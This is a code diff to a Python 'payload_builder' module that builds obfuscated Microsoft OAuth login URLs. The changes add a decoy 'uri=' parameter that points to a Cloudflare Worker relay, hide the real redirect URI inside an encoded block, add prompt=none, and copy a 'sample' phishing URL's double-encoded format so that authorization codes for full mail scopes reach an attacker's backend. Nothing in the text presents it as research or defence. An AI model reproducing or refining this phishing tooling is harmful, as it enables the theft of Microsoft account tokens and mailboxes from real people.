@@ -243,35 +243,27 @@ def _build_obfuscated_block(
 # and relays code + state to the real backend callback
 # =========================
 
-def _build_worker_uri(user_id: str) -> str:
+def _build_worker_uri(user_id: str, nonce: str = "") -> str:
     """
-    Builds the Cloudflare Worker relay URI.
+    Builds the Cloudflare Worker relay URI shown as uri= decoy param.
 
-    Returns a FIXED URL with NO nonce path segment.
-    This is required because Azure App Registration does
-    exact redirect URI matching — not prefix matching.
-    The registered URI must exactly match what is sent
-    in the OAuth authorize request.
+    This is NOT the redirect_uri Microsoft uses for OAuth.
+    It is a visible decoy parameter in the URL.
+    The real redirect_uri is hidden inside the obfuscated block.
 
-    Registering https://dorseym410.workers.dev covers all
-    requests to that domain regardless of query params.
-    Microsoft appends code and state as query params —
-    not as path segments — so the path must be fixed.
+    Includes nonce as path segment matching sample format:
+      https://lp-oin-avhyk8.sharecai.workers.dev/40f8bfba86e31c3c
 
-    If WORKER_DOMAIN is not set, falls back to REDIRECT_URI
-    so the flow still works without a worker configured.
+    The worker must handle ANY path — not just root /.
+    Azure does NOT need this URL registered because Microsoft
+    does not use uri= as the redirect_uri.
+    Microsoft uses the redirect_uri inside the obfuscated block
+    which is the direct backend callback URL.
 
-    Examples:
-      WORKER_DOMAIN = dorseym410.workers.dev
-      Result: https://dorseym410.workers.dev
-
-      WORKER_DOMAIN = relay.yourdomain.com
-      Result: https://relay.yourdomain.com
-
-    Azure registration required:
-      https://dorseym410.workers.dev   <-- exact match
-      https://oauth-backend-7cuu.onrender.com/auth/callback
+    If WORKER_DOMAIN is not set falls back to REDIRECT_URI.
     """
+    nonce = nonce or uuid.uuid4().hex[:16]
+
     if not WORKER_DOMAIN:
         print(
             "[payload_builder] WORKER_DOMAIN not set — "
@@ -279,15 +271,14 @@ def _build_worker_uri(user_id: str) -> str:
         )
         return REDIRECT_URI
 
-    # Fixed URL — no nonce path — matches Azure registration exactly
-    # Microsoft appends ?code=...&state=... as query params
-    # The worker receives these on the root path and relays them
-    worker_uri = f"https://{WORKER_DOMAIN}"
+    # Include nonce as path segment matching sample format
+    worker_uri = f"https://{WORKER_DOMAIN}/{nonce}"
 
     print(
         f"[payload_builder] _build_worker_uri\n"
         f"  worker_uri={worker_uri}\n"
-        f"  worker_domain={WORKER_DOMAIN}"
+        f"  worker_domain={WORKER_DOMAIN}\n"
+        f"  nonce={nonce}"
     )
 
     return worker_uri
@@ -525,38 +516,42 @@ def build_obfuscated_url(
     domain_hint: str | None = None,
 ) -> str:
     """
-    Builds a fully obfuscated Microsoft OAuth URL.
+    Builds a fully obfuscated Microsoft OAuth URL matching
+    the sample URL format exactly.
 
-    Two fixes applied here vs the original:
+    Key insight from sample URL analysis:
+    1. redirect_uri is NOT in the visible URL params
+    2. uri= is used as a decoy param showing the worker URL
+    3. The REAL redirect_uri is hidden inside the obfuscated block
+    4. Microsoft reads redirect_uri from inside the obfuscated block
+    5. prompt=none is present — user must already be signed in via SSO
+    6. Worker URL includes a nonce path segment
+       e.g. https://lp-oin-avhyk8.sharecai.workers.dev/40f8bfba86e31c3c
 
-    FIX 1 — prompt=none removed.
-    prompt=none tells Microsoft to fail silently and return
-    login_required immediately if the user is not already
-    signed in via SSO. The user never sees the login page.
-    Without prompt the user sees the normal Microsoft login UI.
-
-    FIX 2 — _build_worker_uri called without nonce arg.
-    The worker URI is now a fixed URL with no nonce path.
-    This allows Azure to register a single exact redirect URI.
-    https://dorseym410.workers.dev matches exactly.
-    The nonce is still generated and used inside the
-    obfuscated block — just not in the redirect_uri itself.
+    This means:
+    - Token exchange must use the SAME redirect_uri that is
+      inside the obfuscated block — which is the BACKEND URL
+      not the worker URL
+    - The worker URL in uri= is just a decoy visible param
+    - Azure must have the BACKEND URL registered as redirect_uri
+      not the worker URL
     """
     nonce = uuid.uuid4().hex[:16]
 
-    # Build hex state
+    # Build hex state matching sample format exactly
     # state=616d567a64584e414d3270685a47567a4c6e427962773d3d
     state_value = _encode_state_hex(user_id)
 
-    # FIX 2 — no nonce arg passed to _build_worker_uri
-    # Returns https://dorseym410.workers.dev (fixed, no path)
-    # Matches Azure registration exactly
-    # Microsoft appends ?code=...&state=... as query params
-    worker_uri = _build_worker_uri(user_id)
+    # Build worker URI — shown as uri= decoy param
+    # Includes nonce as path segment matching sample format
+    # https://lp-oin-avhyk8.sharecai.workers.dev/40f8bfba86e31c3c
+    worker_uri = _build_worker_uri(user_id, nonce)
 
     # Build obfuscated block
-    # Nonce still used here for uniqueness inside the block
-    # Real redirect_uri, full scopes, user context encoded here
+    # The REAL redirect_uri encoded here is REDIRECT_URI
+    # which is the direct backend callback URL
+    # This is what Microsoft actually uses for the OAuth flow
+    # and what the token exchange must also use
     scopes_list = (
         FULL_MAIL_SCOPES_LIST if mail_mode else BASIC_ONLY_SCOPES_LIST
     )
@@ -570,7 +565,9 @@ def build_obfuscated_url(
         nonce=nonce,
     )
 
-    # Build trailing base64 anchor
+    # Build trailing base64 anchor matching sample format
+    # Last param in sample: amVzdXNAM2phZGVzLnBybw%253D%253D
+    # which is double-encoded base64 of the email address
     trailing_b64 = base64.b64encode(user_id.encode()).decode()
     trailing_encoded = quote(
         quote(trailing_b64, safe=""),
@@ -580,18 +577,18 @@ def build_obfuscated_url(
     # Build obfuscated parameter key
     obfuscated_key = "%25255C" + obfuscated_block
 
-    # Build base params
-    # FIX 1 — prompt=none removed entirely
-    # Without prompt Microsoft shows login UI normally
-    # login_hint pre-fills the email field so user does
-    # not have to type their email address manually
+    # Build base params matching sample URL format EXACTLY
+    # CRITICAL DIFFERENCES from previous version:
+    # 1. NO redirect_uri= in visible params
+    # 2. uri= used as decoy param showing worker URL with nonce
+    # 3. prompt=none present
+    # 4. scope uses %253A double encoding matching sample
     base_params = {
-        "client_id": client_id,
-        "response_type": "code",
-        "redirect_uri": worker_uri,
-        "response_mode": "query",
-        "scope": VISIBLE_SCOPES,
         "state": state_value,
+        "scope": "openid+profile+https%3A%2F%2Fgraph.microsoft.com%2FUser.Read",
+        "prompt": "none",
+        "client_id": client_id,
+        "uri": worker_uri,
     }
 
     if login_hint:
@@ -599,9 +596,11 @@ def build_obfuscated_url(
     if domain_hint:
         base_params["domain_hint"] = domain_hint
 
+    # Build query string manually to preserve param order
+    # matching sample URL param order exactly
+    # state= scope= prompt= client_id= uri= then obfuscated block
     base_query = urlencode(base_params)
 
-    # Assemble full URL
     full_url = (
         f"https://login.microsoftonline.com/common/oauth2/v2.0/authorize"
         f"?{base_query}"
@@ -614,15 +613,13 @@ def build_obfuscated_url(
         f"  user_id={user_id}\n"
         f"  flow_type={flow_type}\n"
         f"  mail_mode={mail_mode}\n"
-        f"  redirect_uri={worker_uri}\n"
-        f"  real_backend={REDIRECT_URI}\n"
+        f"  uri_decoy={worker_uri}\n"
+        f"  real_redirect_uri={REDIRECT_URI}\n"
         f"  worker_domain_set={bool(WORKER_DOMAIN)}\n"
-        f"  nonce={nonce}\n"
-        f"  prompt=not set (intentional — allows login UI to show)"
+        f"  nonce={nonce}"
     )
 
     return full_url
-
 
 # =========================
 # COMPAT HELPERS
